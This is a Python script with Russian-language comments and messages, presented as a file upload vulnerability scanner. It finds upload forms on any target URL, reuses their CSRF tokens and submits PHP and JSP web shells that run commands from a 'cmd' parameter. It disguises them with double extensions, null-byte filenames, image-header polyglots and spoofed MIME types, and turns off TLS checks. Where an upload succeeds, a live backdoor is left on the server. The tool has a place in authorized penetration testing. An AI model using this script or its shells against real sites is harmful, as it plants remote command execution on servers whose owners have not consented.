import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re
import os
import time
import argparse
from pathlib import Path
import mimetypes
from colorama import init, Fore, Style, Back
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

class FileUploadScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.vulnerabilities = []
        self.accepted_files = []
        
    def banner(self):
        print(f"{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{' ' * 16}ADVANCED FILE UPLOAD VULNERABILITY SCANNER{Fore.GREEN}{' ' * 16}{Fore.CYAN}║")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")

    def validate_url(self, url):
        """Валидация URL"""
        if not url.startswith(('http://', 'https://')):
            return False, "[!] URL должен начинаться с http:// или https://"
        try:
            result = urlparse(url)
            if not all([result.scheme, result.netloc]):
                return False, "[!] Некорректный URL формат"
            return True, ""
        except:
            return False, "[!] Ошибка парсинга URL"

    def get_forms(self, url):
        """Получение всех форм с главной страницы"""
        try:
            resp = self.session.get(url, timeout=15, allow_redirects=True)
            resp.raise_for_status()
            
            soup = BeautifulSoup(resp.text, "html.parser")
            forms = soup.find_all("form")
            
            upload_forms = []
            for i, form in enumerate(forms, 1):
                file_inputs = form.find_all("input", {"type": "file"})
                if file_inputs:
                    upload_forms.append({
                        'index': i,
                        'form': form,
                        'file_inputs': file_inputs,
                        'action': form.get("action"),
                        'method': form.get("method", "POST").upper(),
                        'inputs': form.find_all("input")
                    })
            return upload_forms, resp.url
        except Exception as e:
            return [], f"Ошибка получения форм: {e}"

    def extract_csrf_token(self, form):
        """Извлечение CSRF токена"""
        csrf_inputs = form['form'].find_all("input", {"type": "hidden"})
        csrf_token = {}
        for inp in csrf_inputs:
            name = inp.get("name", "").lower()
            if re.search(r"(csrf|token|auth)", name):
                csrf_token[name] = inp.get("value", "")
        return csrf_token

    def prepare_payloads(self):
        """Подготовка тестовых пэйлоудов"""
        return [
           
            ("test.txt", b"Test content", "text/plain"),
            ("test.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01", "image/jpeg"),
            ("test.png", b"\x89PNG\r\n\x1a\n", "image/png"),
            
            
            ("shell.php", b"<?php system($_GET['cmd']); ?>", "text/plain"),
            ("shell.phtml", b"<?php system($_GET['cmd']); ?>", "text/plain"),
            ("shell.php5", b"<?php system($_GET['cmd']); ?>", "text/plain"),
            ("shell.pHp", b"<?php system($_GET['cmd']); ?>", "text/plain"),
            ("shell.jsp", b"<%@ page import=\"java.io.*\" %><% runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "text/plain"),
            
            
            ("shell.php.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("shell.php.png", b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>", "image/png"),
            ("shell.txt.php", b"<?php system($_GET['cmd']); ?>", "text/plain"),
            
            
            ("shell.php%00.jpg", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("shell.php\\0.txt", b"<?php system($_GET['cmd']); ?>", "text/plain"),
            
            
            ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/octet-stream")
        ]

    def test_upload(self, form_data, action_url, data=None):
        """Тестирование загрузки файла"""
        file_param = form_data['file_param']
        payloads = self.prepare_payloads()
        
        results = []
        dangerous_extensions = {'.php', '.phtml', '.php5', '.jsp', '.asp', '.aspx'}
        
        for name, content, mime in payloads:
            try:
                files = {file_param: (name, content, mime)}
                payload_data = data.copy() if data else {}
                
                resp = self.session.post(
                    action_url, 
                    files=files, 
                    data=payload_data,
                    timeout=20,
                    allow_redirects=True
                )
                
                is_success = resp.status_code in (200, 201, 202, 302, 303)
                is_dangerous = any(ext in name.lower() for ext in dangerous_extensions) or b"<?php" in content or b"system(" in content
                
                result = {
                    'filename': name,
                    'mime': mime,
                    'status': resp.status_code,
                    'success': is_success,
                    'dangerous': is_dangerous,
                    'response_length': len(resp.content),
                    'content_type': resp.headers.get('content-type', ''),
                    'location': resp.headers.get('location', '')
                }
                
                results.append(result)
                
                status_color = Fore.RED if is_success and is_dangerous else Fore.GREEN if is_success else Fore.CYAN
                marker = Fore.RED + "[!] VULNERABLE" + Style.RESET_ALL if is_success and is_dangerous else Fore.GREEN + "[✓] Accepted" + Style.RESET_ALL if is_success else Fore.CYAN + "[i] Rejected" + Style.RESET_ALL
                
                print(f"{status_color}{marker}: {name} (Status: {resp.status_code}, Size: {len(resp.content)}B){Style.RESET_ALL}")
                
                if is_success and is_dangerous:
                    self.vulnerabilities.append(result)
                    
            except Exception as e:
                print(f"{Fore.YELLOW}[?] Error {name}: {str(e)[:50]}...{Style.RESET_ALL}")
                results.append({'filename': name, 'error': str(e)})
                
            time.sleep(0.5) 
        
        return results

    def scan(self, target):
        """Основной процесс сканирования"""
        self.banner()
        
        is_valid, error = self.validate_url(target)
        if not is_valid:
            print(f"{Fore.RED}{error}{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.GREEN}[✓] Тестируем: {target}{Style.RESET_ALL}")
        
        upload_forms, final_url = self.get_forms(target)
        
        if not upload_forms:
            print(f"{Fore.RED}[!] Формы загрузки файлов не найдены{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.GREEN}[✓] Найдено форм загрузки: {len(upload_forms)}{Style.RESET_ALL}")
        
        all_results = []
        
        for form_data in upload_forms:
            print(f"\n{Fore.CYAN}╔{'═' * 78}╗")
            print(f"{Fore.CYAN}║ Форма #{form_data['index']} │ Action: {form_data['action'][:60]:<60}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╚{'═' * 78}╝{Style.RESET_ALL}")
            
            
            file_param = form_data['file_inputs'][0].get('name', 'file')
            form_data['file_param'] = file_param
            
            
            csrf_tokens = self.extract_csrf_token(form_data)
            print(f"CSRF токены: {list(csrf_tokens.keys()) or 'Не найдены'}")
            
            
            form_data_dict = {inp.get('name'): inp.get('value', '') for inp in form_data['inputs'] 
                            if inp.get('name') and inp.get('type') != 'file'}
            form_data_dict.update(csrf_tokens)
            
            action_url = urljoin(final_url, form_data['action'] or final_url)
            
            results = self.test_upload(form_data, action_url, form_data_dict)
            all_results.extend(results)
            
            print()
        
        self.print_summary(all_results)
        return len(self.vulnerabilities) > 0

    def print_summary(self, all_results):
        """Вывод итогового отчёта"""
        print(f"\n{Fore.CYAN}{'═' * 80}")
        print(f"{Fore.CYAN}{' ' * 32}ОТЧЁТ ПО СКАНИРОВАНИЮ{' ' * 32}{Fore.CYAN}")
        print(f"{Fore.CYAN}{'═' * 80}{Style.RESET_ALL}")
        
        total_tests = len(all_results)
        vulnerable = len(self.vulnerabilities)
        accepted = len([r for r in all_results if r.get('success')])
        
        print(f"{Fore.CYAN}Всего тестов: {total_tests:>3} │ Уязвимостей: {vulnerable:>2} │ Принято: {accepted:>3}{Style.RESET_ALL}")
        print()
        
        if self.vulnerabilities:
            print(f"{Fore.RED}{'=' * 80}")
            print(f"{Fore.RED}КРИТИЧЕСКИЕ УЯЗВИМОСТИ:{Style.RESET_ALL}")
            print(f"{Fore.RED}{'=' * 80}")
            for vuln in self.vulnerabilities:
                print(f"{Fore.RED}[!] {vuln['filename']} - Status: {vuln['status']} ({vuln['response_length']}B){Style.RESET_ALL}")
            
            print(f"\n{Fore.MAGENTA}{'=' * 80}")
            print(f"{Fore.MAGENTA}🚨 ВЫСОКИЙ РИСК! Обнаружены уязвимости загрузки исполняемых файлов!{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}{'=' * 80}")
        else:
            print(f"{Fore.GREEN}✅ Критические уязвимости не обнаружены{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Расширенный сканер уязвимостей загрузки файлов')
    parser.add_argument('url', nargs='?', help='Целевая URL')
    parser.add_argument('-u', '--url', dest='url', help='Целевая URL')
    args = parser.parse_args()
    
    target = args.url
    if not target:
        target = input(f"{Fore.YELLOW}Введите URL для тестирования: {Style.RESET_ALL}").strip()
    
    scanner = FileUploadScanner()
    scanner.scan(target)

if __name__ == "__main__":
    main()